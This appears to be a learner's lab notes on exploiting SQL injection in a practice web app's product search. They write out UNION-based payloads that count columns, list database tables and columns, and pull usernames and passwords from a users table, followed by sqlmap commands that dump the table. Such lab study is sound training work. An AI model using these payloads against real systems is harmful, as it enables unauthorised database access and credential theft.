
![[Pasted image 20230718205817.png]]

need to enter valid product name

i/p:
x' 1=1#
this returns all the products

and does not give the response of invalid i/p
so we have sql injection

i/p:
Itamae Knife Set' union select null,null,null,null#
Itamae Knife Set is valid i/p item
***need to provide same number of columns/attributes for UNION to work***

this gives true result so table has 4 columns which makes sense coz
1)name
2)price
3)currency
4)image

i/p:
Itamae Knife Set' union select null,null,null,table_name from information_schema.tables#

o/p:

![[Pasted image 20230718213011.png]]

we we get lots of tables name
![[Pasted image 20230718213206.png]]


i/p:
Itamae Knife Set' union select null,null,null,column_name from information_schema.columns#

o/p:

![[Pasted image 20230718213355.png]]

i/p:
Itamae Knife Set' union select null,null,null,password from injection0x03_users#

o/p:
![[Pasted image 20230718213739.png]]

i/p:
Itamae Knife Set' union select null,null,null,username from injection0x03_users#

o/p:
![[Pasted image 20230718213816.png]]


can use intruder or sqlmap to get all the columns

```sh
sqlmap -r req3.txt -T injection0x03_users 
```

![[Pasted image 20230718214407.png]]

```sh
sqlmap -r req3.txt -T injection0x03_users --dump
```

![[Pasted image 20230718214613.png]]

